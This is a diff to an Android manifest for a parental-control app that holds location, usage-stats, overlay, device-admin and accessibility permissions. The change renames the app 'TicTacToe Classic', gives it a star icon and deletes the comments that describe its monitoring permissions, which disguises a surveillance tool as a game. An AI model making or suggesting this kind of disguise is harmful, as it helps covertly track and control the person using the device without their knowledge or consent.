@@ -1,23 +1,18 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.example.parental_control_app">
 
-    <!-- Network & Socket Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    
-    <!-- Location Permissions -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    
-    <!-- App Monitoring & Blocking Permissions -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
     <application
-        android:label="Parental Control"
+        android:label="TicTacToe Classic"
         android:name="${applicationName}"
-        android:icon="@android:drawable/sym_def_app_icon">
+        android:icon="@android:drawable/btn_star_big_on">
         
         <activity
             android:name=".MainActivity"
@@ -33,7 +28,6 @@
             </intent-filter>
         </activity>
 
-        <!-- Device Admin Receiver -->
         <receiver android:name=".AdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
             android:exported="true">
@@ -44,7 +38,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Accessibility Service -->
         <service android:name=".AppBlockerAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true">
